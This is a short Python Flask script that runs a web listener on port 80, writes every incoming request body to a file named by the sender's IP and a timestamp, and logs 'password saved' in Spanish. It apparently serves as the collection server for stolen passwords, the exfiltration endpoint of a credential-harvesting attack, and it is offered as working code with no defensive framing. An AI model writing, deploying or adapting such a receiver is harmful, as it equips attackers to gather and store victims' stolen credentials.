#!/usr/bin/env python
#-*- coding: utf-8 -*-

from flask import Flask,request
import datetime

app = Flask(__name__)


@app.route('/',  methods=['GET','POST'])
def parse_request():
        data = request.data
        print data
        archivo = str(request.remote_addr)+"_"+datetime.datetime.now().strftime('%b-%d-%I%M%p-%G')+".dat"
        with open(archivo,'wb') as a:
            a.write(data)
        print "Contraseña guardada en: %s" % (archivo)
        return '',200

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)

